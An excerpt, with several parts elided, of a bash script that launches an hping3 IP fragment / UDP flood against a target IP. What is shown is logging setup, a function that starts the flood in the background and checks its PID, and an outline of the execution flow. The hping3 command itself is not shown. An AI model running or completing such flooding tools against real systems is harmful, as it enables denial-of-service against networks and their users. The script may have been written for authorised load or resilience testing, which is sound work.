...
LOG_FILE="hping3_ip_fragment_$(date +%Y%m%d_%H%M%S).log"
VERBOSE=true
...
start_hping3_flood() {
    log "Starting hping3 IP fragment attack to $TARGET_IP"
    ...
    if [ -n "$HPING_PID" ] && kill -0 "$HPING_PID" 2>/dev/null; then
        log "hping3 IP fragment attack started successfully (PID: $HPING_PID)"
        return 0
    else
        log "ERROR: Failed to start hping3 IP fragment attack"
        return 1
    fi
}
...
EXECUTION FLOW:
   ...
   5. Start hping3 UDP flood (background process)
   6. Main loop:
